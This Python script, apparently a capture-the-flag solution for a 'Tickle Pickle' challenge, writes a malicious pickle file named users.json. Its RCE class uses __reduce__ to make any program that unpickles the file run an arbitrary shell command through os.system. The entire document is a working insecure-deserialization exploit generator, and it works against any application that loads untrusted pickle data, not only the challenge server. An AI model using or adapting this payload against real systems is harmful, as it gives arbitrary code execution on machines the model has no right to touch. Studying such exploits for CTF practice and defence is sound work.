# Sainya-Ranakshetram CTF Tickle Pickle Exploit by mtcs20ck
# Author: Chetanya Kunndra
# Email: mtcs20ck@policeuniversity.ac.in
# Username: mtcs20ck
# Date: 23rd Nov 2021
# Overview: Use this utility to create the users.json file. Then run server.py to execute the
# malicious payload

from sys import argv
from pickle import dumps
from os import system

class RCE:
    def __init__(self, command):
        self.payload = command

    def __reduce__(self):
        return (system, (self.payload, ), )

def exploit(command):
    with open("users.json", "wb") as wo:
        wo.write(dumps(RCE(command)))

def usage():
    print('[+] Usage: python3 tickle_pickle_exploit.py -c "<command>"')
    print("\n[+] Examples -")
    print('python3 tickle_pickle_exploit.py -c "uname -a"')
    print('python3 tickle_pickle_exploit.py -c "ls -la"')
    print('python3 tickle_pickle_exploit.py -c "echo \'hi\' > file.txt"')

if __name__ == "__main__":
    if len(argv) < 3 :
        usage()
    else:
        option = argv[1]
        if option != "-c":
            print("[-] Incorrect command line parameter.")
            usage()
        else:
            command = argv[2]
            exploit(command)
